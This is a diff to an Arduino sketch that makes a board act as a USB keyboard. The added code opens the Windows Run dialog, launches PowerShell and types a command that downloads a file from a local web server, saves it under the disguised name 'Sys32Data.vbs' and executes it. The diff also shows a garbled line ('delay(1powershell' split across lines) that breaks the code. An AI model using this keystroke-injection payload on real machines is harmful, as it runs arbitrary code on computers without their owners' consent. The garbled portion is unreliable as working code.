@@ -25,7 +25,24 @@ void setup()
   Keyboard.begin();
 
   //delay for debugging and safety
-  delay(5000);
+  delay(1powershell
+  000);
+
+  
+  Keyboard.press(KEY_LEFT_GUI);
+  Keyboard.press('r');
+  Keyboard.releaseAll();
+
+  delay(200);
+  Keyboardprint("powershell");
+  delay(500);
+  pressKey(KEY_RETURN);
+  delay(1000);
+
+  //exemple to download a vbs script from a web-server
+  Keyboardprint("$client = new-object System.Net.WebClient;$client.DownloadFile(\"http://192.168.0.120:8080/test.txt\",\"Sys32Data.vbs\");Start .\\Sys32Data.vbs;exit");
+  delay(300);
+  pressKey(KEY_RETURN);
 
   Keyboard.end();
 }
@@ -86,6 +103,10 @@ void Keyboardprint(String text)
       {
         keyboardScanCode(100);
       }
+      else if (text[i]=='+')
+      {
+        printMaj(1,46);
+      }
       else
       {
         String c=fr2en(text[i]);
@@ -103,7 +124,7 @@ void keyboardScanCode(byte code) //to press special key like '\', found here: ht
   delay(4); 
 }
 
-void printAG(int n, int s) //to print '\'
+void printAG(int n, int s) 
 {    
   for (int i=0;i<n;i++)
   {
@@ -124,38 +145,5 @@ void printMaj(int n, int s)
 }
 
 
-
-void loop() {}
-  }
-  
-}
-
-void keyboardScanCode(byte code) //to press special key like '\', found here: https://forum.arduino.cc/t/keyboard-h-et-antislash/565172/3 (thanks to nico78)
-{  
-  Keyboard.press(code+136);  
-  delay(4);  
-  Keyboard.release(code+136);  
-  delay(4); 
-}
-
-void printAG(int n, int s) //to print alt gr + some character
-{    
-  for (int i=0;i<n;i++)
-  {
-    Keyboard.press(KEY_RIGHT_ALT);  
-    keyboardScanCode(s);  
-    Keyboard.release(KEY_RIGHT_ALT);  
-  }
-}
-
-void printMaj(int n, int s) //print an uppercase character
-{
-  for (int i=0;i<n;i++)
-  {
-    Keyboard.press(KEY_LEFT_SHIFT);  
-    keyboardScanCode(s);  
-    Keyboard.release(KEY_LEFT_SHIFT);  
-  }
-}
 
 void loop() {}
